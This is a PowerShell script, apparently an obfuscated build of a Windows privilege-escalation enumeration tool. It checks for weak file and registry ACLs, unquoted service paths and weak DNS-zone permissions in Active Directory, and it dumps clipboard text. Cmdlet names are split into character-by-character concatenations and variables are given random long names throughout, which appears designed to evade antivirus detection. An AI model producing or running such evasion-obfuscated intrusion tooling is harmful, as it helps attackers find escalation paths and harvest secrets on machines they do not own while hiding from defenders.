


[CmdletBinding()]
param(
  [switch]$TimeStamp,
  [switch]$FullCheck,
  [switch]$Excel
)

function returnHotFixID {
  param(
    [string]$title
  )
  if (($title | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value) {
    return (($title | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value)
  }
  elseif (($title | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value) {
    return (($title | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value)
  }
}

function Start-ACLCheck {
  param(
    $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF, $RzzWYqHTdczLyjRsSAcybNcBYPGhkGsZFBBUoeAJQwyySfhCbqitBTsjCeGTQLNngLyabRvHcnqIGbDgTdYdNErtqpdVQTakAoeh)
  if ($null -ne $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF) {
    try {
      $UdrEkWFthdRwqxgTjIFsVQkhYmidYVZgbldYISUNJuHmhjDjrbIoZMlKPuKBIYeLbIciGZhWqVaKtMhKKMMjUvnwjYaFeuqyQWbl = &('G' + 'e' + 't' + '-' + 'A' + 'c' + 'l') $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF -ErrorAction SilentlyContinue
    }
    catch { $null }
    
    if ($UdrEkWFthdRwqxgTjIFsVQkhYmidYVZgbldYISUNJuHmhjDjrbIoZMlKPuKBIYeLbIciGZhWqVaKtMhKKMMjUvnwjYaFeuqyQWbl) { 
      $YPtDLdbIZdYeMJZmCPBEqxdapQUckwURShcFIfYueQJtHIjjPuyppqXapYWEtgbjKpsxhFpoKNLEaiRpnnBSFbhpOgGjwIqAdnHv = @()
      $YPtDLdbIZdYeMJZmCPBEqxdapQUckwURShcFIfYueQJtHIjjPuyppqXapYWEtgbjKpsxhFpoKNLEaiRpnnBSFbhpOgGjwIqAdnHv += "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:COMPUTERNAME\$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERNAME"
      if ($UdrEkWFthdRwqxgTjIFsVQkhYmidYVZgbldYISUNJuHmhjDjrbIoZMlKPuKBIYeLbIciGZhWqVaKtMhKKMMjUvnwjYaFeuqyQWbl.Owner -like $YPtDLdbIZdYeMJZmCPBEqxdapQUckwURShcFIfYueQJtHIjjPuyppqXapYWEtgbjKpsxhFpoKNLEaiRpnnBSFbhpOgGjwIqAdnHv ) { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$YPtDLdbIZdYeMJZmCPBEqxdapQUckwURShcFIfYueQJtHIjjPuyppqXapYWEtgbjKpsxhFpoKNLEaiRpnnBSFbhpOgGjwIqAdnHv has ownership of $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF" -ForegroundColor Red }
      whoami.exe /groups /fo csv | &('s' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'o' + 'b' + 'j' + 'e' + 'c' + 't') -skip 2 | &('C' + 'o' + 'n' + 'v' + 'e' + 'r' + 't' + 'F' + 'r' + 'o' + 'm' + '-' + 'C' + 's' + 'v') -Header 'group name' | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -ExpandProperty 'group name' | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $YPtDLdbIZdYeMJZmCPBEqxdapQUckwURShcFIfYueQJtHIjjPuyppqXapYWEtgbjKpsxhFpoKNLEaiRpnnBSFbhpOgGjwIqAdnHv += $_ }
      $CkukhFuVRCnYNJSDcFeOpHyypkpMGyeCrPxhPCKDnyjsbWjHBHIcoFbZMblOKNsHThydSwyQHzKqewyyIFPRENeWInjPEYkJfTKa = $false
      foreach ($UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK in $YPtDLdbIZdYeMJZmCPBEqxdapQUckwURShcFIfYueQJtHIjjPuyppqXapYWEtgbjKpsxhFpoKNLEaiRpnnBSFbhpOgGjwIqAdnHv) {
        $pbYcjxamaRCpHAJKcNuBCJqbGcztRwyyoeBJPwqumVEVaoPxCIHzInmMqTTvLLFRDxwdXvzcJFIqJcwxTxvgsFOSCJTnhWKuuHFV = $UdrEkWFthdRwqxgTjIFsVQkhYmidYVZgbldYISUNJuHmhjDjrbIoZMlKPuKBIYeLbIciGZhWqVaKtMhKKMMjUvnwjYaFeuqyQWbl.Access | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_.IdentityReference -like $UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK }
        $wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV = ""
        switch -WildCard ($pbYcjxamaRCpHAJKcNuBCJqbGcztRwyyoeBJPwqumVEVaoPxCIHzInmMqTTvLLFRDxwdXvzcJFIqJcwxTxvgsFOSCJTnhWKuuHFV.FileSystemRights) {
          "FullControl" { 
            $wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV = "FullControl"
            $CkukhFuVRCnYNJSDcFeOpHyypkpMGyeCrPxhPCKDnyjsbWjHBHIcoFbZMblOKNsHThydSwyQHzKqewyyIFPRENeWInjPEYkJfTKa = $true 
          }
          "Write*" { 
            $wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV = "Write"
            $CkukhFuVRCnYNJSDcFeOpHyypkpMGyeCrPxhPCKDnyjsbWjHBHIcoFbZMblOKNsHThydSwyQHzKqewyyIFPRENeWInjPEYkJfTKa = $true 
          }
          "Modify" { 
            $wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV = "Modify"
            $CkukhFuVRCnYNJSDcFeOpHyypkpMGyeCrPxhPCKDnyjsbWjHBHIcoFbZMblOKNsHThydSwyQHzKqewyyIFPRENeWInjPEYkJfTKa = $true 
          }
        }
        Switch ($pbYcjxamaRCpHAJKcNuBCJqbGcztRwyyoeBJPwqumVEVaoPxCIHzInmMqTTvLLFRDxwdXvzcJFIqJcwxTxvgsFOSCJTnhWKuuHFV.RegistryRights) {
          "FullControl" { 
            $wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV = "FullControl"
            $CkukhFuVRCnYNJSDcFeOpHyypkpMGyeCrPxhPCKDnyjsbWjHBHIcoFbZMblOKNsHThydSwyQHzKqewyyIFPRENeWInjPEYkJfTKa = $true 
          }
        }
        if ($wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV) {
          if ($RzzWYqHTdczLyjRsSAcybNcBYPGhkGsZFBBUoeAJQwyySfhCbqitBTsjCeGTQLNngLyabRvHcnqIGbDgTdYdNErtqpdVQTakAoeh) { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$RzzWYqHTdczLyjRsSAcybNcBYPGhkGsZFBBUoeAJQwyySfhCbqitBTsjCeGTQLNngLyabRvHcnqIGbDgTdYdNErtqpdVQTakAoeh found with permissions issue:" -ForegroundColor Red }
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor red "Identity $($pbYcjxamaRCpHAJKcNuBCJqbGcztRwyyoeBJPwqumVEVaoPxCIHzInmMqTTvLLFRDxwdXvzcJFIqJcwxTxvgsFOSCJTnhWKuuHFV.IdentityReference) has '$wZTbzwnxVEuwQcULrXfDVeBTivYMeAaSCPQDYwmKncIsQeVQXFAKcBwSrWBVUXFzrVdpCSEqUjsjqildXtrzkAWpXesSxVxwvlNV' perms for $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF"
        }
      }    
      if ($CkukhFuVRCnYNJSDcFeOpHyypkpMGyeCrPxhPCKDnyjsbWjHBHIcoFbZMblOKNsHThydSwyQHzKqewyyIFPRENeWInjPEYkJfTKa -eq $false) {
        if ($PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF.Length -gt 3) {
          $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF = &('S' + 'p' + 'l' + 'i' + 't' + '-' + 'P' + 'a' + 't' + 'h') $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF
          &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF -ServiceName $RzzWYqHTdczLyjRsSAcybNcBYPGhkGsZFBBUoeAJQwyySfhCbqitBTsjCeGTQLNngLyabRvHcnqIGbDgTdYdNErtqpdVQTakAoeh
        }
      }
    }
    else {
      $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF = &('S' + 'p' + 'l' + 'i' + 't' + '-' + 'P' + 'a' + 't' + 'h') $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF
      &('S' + 't' + 'a' + 'r' + 't' + '-' + 'A' + 'C' + 'L' + 'C' + 'h' + 'e' + 'c' + 'k') $PJZZqCZJBuxgNttecjPhAAdEfeiMzAzxTwxTLyBxttXJnvDGtciIAdXxRTIdUuiaWwmnpkLETtDioGLQFEADSnnWDvMwkCZqGQqF $RzzWYqHTdczLyjRsSAcybNcBYPGhkGsZFBBUoeAJQwyySfhCbqitBTsjCeGTQLNngLyabRvHcnqIGbDgTdYdNErtqpdVQTakAoeh
    }
  }
}

function UnquotedServicePathCheck {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Fetching the list of services, this may take a while..."
  $AdAfBhChmfzrcmklIKLgTSuftOclSkUZPgciQoGPTbJFyIiUevHPjOxRCttgcPRvczRAVCKnpwrFkFIoYfYBPLnXoqxGrfvpzSSK = &('G' + 'e' + 't' + '-' + 'W' + 'm' + 'i' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -Class Win32_Service | 
    &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" -and ($_.StartMode -eq "Auto" -or $_.StartMode -eq "Manual") -and ($_.State -eq "Running" -or $_.State -eq "Stopped") }
  if ($($AdAfBhChmfzrcmklIKLgTSuftOclSkUZPgciQoGPTbJFyIiUevHPjOxRCttgcPRvczRAVCKnpwrFkFIoYfYBPLnXoqxGrfvpzSSK | &('M' + 'e' + 'a' + 's' + 'u' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't')).Count -lt 1) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No unquoted service paths were found"
  }
  else {
    $AdAfBhChmfzrcmklIKLgTSuftOclSkUZPgciQoGPTbJFyIiUevHPjOxRCttgcPRvczRAVCKnpwrFkFIoYfYBPLnXoqxGrfvpzSSK | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Unquoted Service Path found!" -ForegroundColor red
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') Name: $_.Name
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') PathName: $_.PathName
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') StartName: $_.StartName 
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') StartMode: $_.StartMode
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') Running: $_.State
    } 
  }
}

function TimeElapsed { 
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Time Running: $($yyezUnkJyLNBmmVtCCjfSWhCxxJzEqFxYrjoxyrtzbxYvGmXOcpJZzfZGnnOZnHiXtaxFbChzRxCTsUndRYIpSKpiZCbRBKzcwSo.Elapsed.Minutes):$($yyezUnkJyLNBmmVtCCjfSWhCxxJzEqFxYrjoxyrtzbxYvGmXOcpJZzfZGnnOZnHiXtaxFbChzRxCTsUndRYIpSKpiZCbRBKzcwSo.Elapsed.Seconds)" 
}

function Get-ClipBoardText {
  &('A' + 'd' + 'd' + '-' + 'T' + 'y' + 'p' + 'e') -AssemblyName PresentationCore
  $jadWCliOYnZhkAUluyLhOIrKIVJScGnwQTwudnKnYKPZCVwaKPQITSEHNIInbuNFSLGZimmyNbVxElqGFgHSiwVHZwpDIkRWRDUO = [Windows.Clipboard]::GetText()
  if ($jadWCliOYnZhkAUluyLhOIrKIVJScGnwQTwudnKnYKPZCVwaKPQITSEHNIInbuNFSLGZimmyNbVxElqGFgHSiwVHZwpDIkRWRDUO) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
    if ($TimeStamp) { TimeElapsed }
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| ClipBoard text found:"
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $jadWCliOYnZhkAUluyLhOIrKIVJScGnwQTwudnKnYKPZCVwaKPQITSEHNIInbuNFSLGZimmyNbVxElqGFgHSiwVHZwpDIkRWRDUO
  }
}

function Get-DomainContext {
  try {
    return [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()
  }
  catch {
    return $null
  }
}

function Convert-SidToName {
  param(
    $CCvjwYkCKrUDVIWZrvpjHrcpmXsxealhdpTDqmsGZXygDfRvXVlRWBqZbfCQJoVgJBcmMTsfNGOeZSLHuHjzxVYWyAPWdLImkUIn
  )
  if ($null -eq $CCvjwYkCKrUDVIWZrvpjHrcpmXsxealhdpTDqmsGZXygDfRvXVlRWBqZbfCQJoVgJBcmMTsfNGOeZSLHuHjzxVYWyAPWdLImkUIn) { return $null }
  try {
    if ($CCvjwYkCKrUDVIWZrvpjHrcpmXsxealhdpTDqmsGZXygDfRvXVlRWBqZbfCQJoVgJBcmMTsfNGOeZSLHuHjzxVYWyAPWdLImkUIn -is [System.Security.Principal.SecurityIdentifier]) {
      $KgqentWFPeDQZvLFUBIrksldEfoEmQMDbySWTMrTilRqfbRSgsWQOmdGjpCAqyiAZUHGnqtYMusnoFJbgQjNzwCgDooTULaglNRm = $CCvjwYkCKrUDVIWZrvpjHrcpmXsxealhdpTDqmsGZXygDfRvXVlRWBqZbfCQJoVgJBcmMTsfNGOeZSLHuHjzxVYWyAPWdLImkUIn
    }
    else {
      $KgqentWFPeDQZvLFUBIrksldEfoEmQMDbySWTMrTilRqfbRSgsWQOmdGjpCAqyiAZUHGnqtYMusnoFJbgQjNzwCgDooTULaglNRm = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.Security.Principal.SecurityIdentifier($CCvjwYkCKrUDVIWZrvpjHrcpmXsxealhdpTDqmsGZXygDfRvXVlRWBqZbfCQJoVgJBcmMTsfNGOeZSLHuHjzxVYWyAPWdLImkUIn)
    }
    return $KgqentWFPeDQZvLFUBIrksldEfoEmQMDbySWTMrTilRqfbRSgsWQOmdGjpCAqyiAZUHGnqtYMusnoFJbgQjNzwCgDooTULaglNRm.Translate([System.Security.Principal.NTAccount]).Value
  }
  catch {
    try { return $KgqentWFPeDQZvLFUBIrksldEfoEmQMDbySWTMrTilRqfbRSgsWQOmdGjpCAqyiAZUHGnqtYMusnoFJbgQjNzwCgDooTULaglNRm.Value }
    catch { return [string]$CCvjwYkCKrUDVIWZrvpjHrcpmXsxealhdpTDqmsGZXygDfRvXVlRWBqZbfCQJoVgJBcmMTsfNGOeZSLHuHjzxVYWyAPWdLImkUIn }
  }
}

function Get-WeakDnsUpdateFindings {
  param(
    [System.DirectoryServices.ActiveDirectory.Domain]$DomainContext
  )
  if (-not $DomainContext) { return @() }
  $XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm = $DomainContext.GetDirectoryEntry().distinguishedName
  $WbOeMvcPBSTOvqSFgfLDULVCisCSPzYpJhxuPZXbfIPtCDojsZANQYfZwkzombDaOYxRqgzpXJoDSHPpuXWdVmCCoODfilOCMgmw = $DomainContext.Forest.RootDomain.GetDirectoryEntry().distinguishedName
  $PqAabWkmJPipTgIPlgEOqjqxAwjATZSmgWBLkWZBGxdBbdyblcztOCUsaBAeFytMTVYfHYeWOyOJmNWfsKfOoqJcUsChjHzNJkHU = @(
    "LDAP://CN=MicrosoftDNS,DC=DomainDnsZones,$XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm",
    "LDAP://CN=MicrosoftDNS,DC=ForestDnsZones,$WbOeMvcPBSTOvqSFgfLDULVCisCSPzYpJhxuPZXbfIPtCDojsZANQYfZwkzombDaOYxRqgzpXJoDSHPpuXWdVmCCoODfilOCMgmw",
    "LDAP://CN=MicrosoftDNS,$XTlmLmIVmbziIeqmqVDhzFPrvwKvIyxqaMXgQbBsatzrqhQpXgNaLGMsveWafLfpeLYRwPGDFNtJzLJjjjOLPamRvWmKSKFXcHIm"
  )
  $cAVHnyGhyBAReIYsARqsHaZThxUsziIsJOxIgpETaUbkIDHILmcyraFGPwxsbVsCjbhHrAvvdFnmzhCrhkKKgAFhhpHECGQdoVpB = @(
    "authenticated users",
    "everyone",
    "domain users"
  )
  $ZZKCBmrZZheGeEsieUHemDSZjkYnKrWlzlzyERkGFaGyfRYKMmouTuWjmYOqUGSKdeaJejXVdjRCgDTgEgDPKtkUuYGjCtVyTPVs = @("GenericAll", "GenericWrite", "CreateChild", "WriteProperty", "WriteDacl", "WriteOwner")
  $coDbZsElkSZqNzEBOdwXiByTLXVmyNngQWpUgzCwckQypAQZwIDNfYaAsvqWgJteRhBjsfFZgIBShwyTErtpfEbKOjQMkldWzMKg = @()
  foreach ($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF in $PqAabWkmJPipTgIPlgEOqjqxAwjATZSmgWBLkWZBGxdBbdyblcztOCUsaBAeFytMTVYfHYeWOyOJmNWfsKfOoqJcUsChjHzNJkHU) {
    try {
      $EEsLqNtWRYXGFHTXOmJOMsHYhrMQdhaZJvKcvGsVvqNhPcbEXeZsEsBdCbuvdQRSIHWmtJrrsLjUupnOspFopApiTewfXFEbvTYm = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.DirectoryServices.DirectoryEntry($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF)
      $null = $EEsLqNtWRYXGFHTXOmJOMsHYhrMQdhaZJvKcvGsVvqNhPcbEXeZsEsBdCbuvdQRSIHWmtJrrsLjUupnOspFopApiTewfXFEbvTYm.NativeGuid
    }
    catch { continue }
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn = &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') System.DirectoryServices.DirectorySearcher($EEsLqNtWRYXGFHTXOmJOMsHYhrMQdhaZJvKcvGsVvqNhPcbEXeZsEsBdCbuvdQRSIHWmtJrrsLjUupnOspFopApiTewfXFEbvTYm)
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.Filter = "(objectClass=dnsZone)"
    $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.PageSize = 500
    $LewKCDANPvLPyYnjKsuyIrMeyLMtEWljJFDLUXWAgEMmFETSfwLeptWafeFwFVVvhWUuSuxwyTIvAyuTzwpmTeEoCqacGEWwmRfz = $SxqWZJilZxocwEiPSdAKHvAscnnSnepiPwqYQfYqQgSIMcAYakBnnqGfiEHAktkgLQvfQjdktJqRZYCiPoukQOmeXfXtIITWaEdn.FindAll()
    foreach ($KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk in $LewKCDANPvLPyYnjKsuyIrMeyLMtEWljJFDLUXWAgEMmFETSfwLeptWafeFwFVVvhWUuSuxwyTIvAyuTzwpmTeEoCqacGEWwmRfz) {
      try {
        $QUbgrJuBoesdTObGmbOyaNtYnzyCnkCGVxzXUEhycjaBaxyOXzkdBsoZSZwXfOQvtTVYoFmUxhGmxGwgppOJCihlCyjfPvotZrSm = $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk.GetDirectoryEntry()
        $QUbgrJuBoesdTObGmbOyaNtYnzyCnkCGVxzXUEhycjaBaxyOXzkdBsoZSZwXfOQvtTVYoFmUxhGmxGwgppOJCihlCyjfPvotZrSm.Options.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
        $bFuTPJpNXsEZAEwkpkFTWpIluoUBeDHiujZUbnWhICbHXjDJyJACTdPLqjzpYCVYuNEHieWdwQSbVwyDTgkwDLBZqKnqIEVdHnkp = $QUbgrJuBoesdTObGmbOyaNtYnzyCnkCGVxzXUEhycjaBaxyOXzkdBsoZSZwXfOQvtTVYoFmUxhGmxGwgppOJCihlCyjfPvotZrSm.ObjectSecurity
        foreach ($UqmWKdxKBxZdXgnmrtkyxJwIqiGqlCRJmXsPkAVUhngYtpedbOMKOjqUjiRVAsWpUSzmTApzrgiFlZtideOYJkjjfzgXMhZCwHCi in $bFuTPJpNXsEZAEwkpkFTWpIluoUBeDHiujZUbnWhICbHXjDJyJACTdPLqjzpYCVYuNEHieWdwQSbVwyDTgkwDLBZqKnqIEVdHnkp.Access) {
          if ($UqmWKdxKBxZdXgnmrtkyxJwIqiGqlCRJmXsPkAVUhngYtpedbOMKOjqUjiRVAsWpUSzmTApzrgiFlZtideOYJkjjfzgXMhZCwHCi.AccessControlType -ne 'Allow') { continue }
          $psckZAaGleVxLchCWGJsrbQBwMtGGWalyBcKfLvNqLZcSvTDdZdRuGiCfSuLReeotAybXRaAcCuhdnRASHoaLzdhpEjySglqOGUN = &('C' + 'o' + 'n' + 'v' + 'e' + 'r' + 't' + '-' + 'S' + 'i' + 'd' + 'T' + 'o' + 'N' + 'a' + 'm' + 'e') $UqmWKdxKBxZdXgnmrtkyxJwIqiGqlCRJmXsPkAVUhngYtpedbOMKOjqUjiRVAsWpUSzmTApzrgiFlZtideOYJkjjfzgXMhZCwHCi.IdentityReference
          if (-not $psckZAaGleVxLchCWGJsrbQBwMtGGWalyBcKfLvNqLZcSvTDdZdRuGiCfSuLReeotAybXRaAcCuhdnRASHoaLzdhpEjySglqOGUN) { continue }
          $SIxrtCPVyURzPFhTZXABjOuFWKUzsLWQkmxkeaJhKLZSiyqNLtrQQgoYGRGLtpnqrIgQeJtAltaHRXlASMKUHDaYzkvxNUmObUgd = $psckZAaGleVxLchCWGJsrbQBwMtGGWalyBcKfLvNqLZcSvTDdZdRuGiCfSuLReeotAybXRaAcCuhdnRASHoaLzdhpEjySglqOGUN.ToLower()
          if (-not ($cAVHnyGhyBAReIYsARqsHaZThxUsziIsJOxIgpETaUbkIDHILmcyraFGPwxsbVsCjbhHrAvvdFnmzhCrhkKKgAFhhpHECGQdoVpB | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $SIxrtCPVyURzPFhTZXABjOuFWKUzsLWQkmxkeaJhKLZSiyqNLtrQQgoYGRGLtpnqrIgQeJtAltaHRXlASMKUHDaYzkvxNUmObUgd -like "*${_}*" })) { continue }
          $ERpjTiryCFoEtrWIfXLuPOuuURnVLpVgJTygdOxaRotaoPZQRAkJsMNKQiacgaedPSoNONrggUlsczpqTWdNufSglZeMANBrhNOT = $UqmWKdxKBxZdXgnmrtkyxJwIqiGqlCRJmXsPkAVUhngYtpedbOMKOjqUjiRVAsWpUSzmTApzrgiFlZtideOYJkjjfzgXMhZCwHCi.ActiveDirectoryRights.ToString()
          if (-not ($ZZKCBmrZZheGeEsieUHemDSZjkYnKrWlzlzyERkGFaGyfRYKMmouTuWjmYOqUGSKdeaJejXVdjRCgDTgEgDPKtkUuYGjCtVyTPVs | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $ERpjTiryCFoEtrWIfXLuPOuuURnVLpVgJTygdOxaRotaoPZQRAkJsMNKQiacgaedPSoNONrggUlsczpqTWdNufSglZeMANBrhNOT -like "*${_}*" })) { continue }
          $coDbZsElkSZqNzEBOdwXiByTLXVmyNngQWpUgzCwckQypAQZwIDNfYaAsvqWgJteRhBjsfFZgIBShwyTErtpfEbKOjQMkldWzMKg += [pscustomobject]@{
            Zone      = $QUbgrJuBoesdTObGmbOyaNtYnzyCnkCGVxzXUEhycjaBaxyOXzkdBsoZSZwXfOQvtTVYoFmUxhGmxGwgppOJCihlCyjfPvotZrSm.Properties["name"].Value
            Partition = $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.Split(',')[1]
            Principal = $psckZAaGleVxLchCWGJsrbQBwMtGGWalyBcKfLvNqLZcSvTDdZdRuGiCfSuLReeotAybXRaAcCuhdnRASHoaLzdhpEjySglqOGUN
            Rights    = $ERpjTiryCFoEtrWIfXLuPOuuURnVLpVgJTygdOxaRotaoPZQRAkJsMNKQiacgaedPSoNONrggUlsczpqTWdNufSglZeMANBrhNOT
          }
        }
      }
      catch { continue }
    }
  }
  return ($coDbZsElkSZqNzEBOdwXiByTLXVmyNngQWpUgzCwckQypAQZwIDNfYaAsvqWgJteRhBjsfFZgIBShwyTErtpfEbKOjQMkldWzMKg | &('S' + 'o' + 'r' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Zone, Principal -Unique)
}

